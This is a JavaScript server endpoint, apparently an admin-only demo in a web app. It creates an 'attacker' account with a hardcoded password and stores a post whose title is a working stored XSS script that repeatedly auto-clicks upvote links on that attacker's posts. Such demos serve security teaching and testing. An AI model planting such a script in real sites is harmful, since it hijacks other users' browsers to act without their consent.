import { authGuard } from "$lib/admin/auth"
import * as db from "$lib/_db"
import { createUser } from "$lib/_db/users"
import { createPostRecord } from "$lib/api/posts.util"

const attackScript = (attackerName) => `
<script>
  setInterval(() => {
    [...document.querySelectorAll('a')]
      .filter(a => a.textContent === '@${attackerName}')
      .map(a => a.closest('.card')?.querySelector('a.positive:not(.active)'))
      .filter(Boolean)
      .forEach(a => a.click())
  }, 2000)
</script>
`

export async function post({ request }) {
  return authGuard(request, async () => {
    const { attackerName } = await request.json()

    try {
      await createUser({ name: attackerName, password: "UBUTetGym6" })
    } catch (err) {
      if (err?.response?.status === 409) {
        // that's ok, already exists
      } else {
        console.error("Failed to create attacker user", err)
        return {
          status: 500,
          body: `Failed to create attacker user (${attackerName})`,
        }
      }
    }

    const { current_era: eraPeriod } = await db.get("$settings")

    const record = createPostRecord(
      { eraPeriod },
      {
        author: attackerName,
        description: "vou zette tous moche",
        title: attackScript(attackerName),
      }
    )

    try {
      await db.put(record)
    } catch (err) {
      return {
        status: 500,
        body: `Failed to post XSS post: ${err}`,
      }
    }

    return { body: record }
  })
}
